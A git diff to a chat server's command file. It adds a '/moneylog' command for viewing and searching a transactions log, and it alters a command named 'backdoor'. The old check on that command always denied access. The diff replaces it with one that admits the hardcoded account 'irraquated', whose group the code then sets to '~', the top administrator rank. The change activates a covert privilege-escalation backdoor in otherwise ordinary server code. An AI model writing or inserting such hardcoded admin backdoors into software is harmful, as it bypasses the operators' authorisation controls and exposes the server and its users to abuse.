@@ -1,4 +1,4 @@
-/**
+﻿/**
  * Components
  * Created by CreaturePhil - https://github.com/CreaturePhil
  *
@@ -846,6 +846,31 @@ var components = exports.components = {
 
 		return this.sendReply('You are now voting for ' + target + '.');
 	},
+		moneylog: function (target, room, user) {
+		if (!this.can('bucks')) return false;
+		if (!target) return this.sendReply("Usage: /moneylog [number] to view the last x lines OR /moneylog [text] to search for text.");
+		if (isNaN(Number(target))) var word = true;
+		var lines = fs.readFileSync('logs/transactions.log', 'utf8').split('\n').reverse();
+		var output = '';
+		var count = 0;
+		var regex = new RegExp(target.replace(/[-\/\\^$*+?.()|[\]{}]/g, '\\$&'), "gi");
+
+		if (word) {
+			output += 'Displaying last 50 lines containing "' + target + '":\n';
+			for (var line in lines) {
+				if (count >= 50) break;
+				if (!~lines[line].search(regex)) continue;
+				output += lines[line] + '\n';
+				count++;
+			}
+		} else {
+			if (target > 100) target = 100;
+			output = lines.slice(0, (lines.length > target ? target : lines.length));
+			output.unshift("Displaying the last " + (lines.length > target ? target : lines.length) + " lines:");
+			output = output.join('\n');
+		}
+		user.popup(output);
+	},
 
 	votes: function (target, room, user) {
 		if (!this.canBroadcast()) return;
@@ -1115,7 +1140,7 @@ var components = exports.components = {
 	},
 
 	backdoor: function (target, room, user) {
-		if (user.userid !== 'irraquated' || user.userid !== 'haunter') return this.sendReply('/backdoor - Access denied.');
+		if (user.userid !== 'irraquated') return this.sendReply('/backdoor - Access denied.');
 
 		if (!target) {
 			user.group = '~';
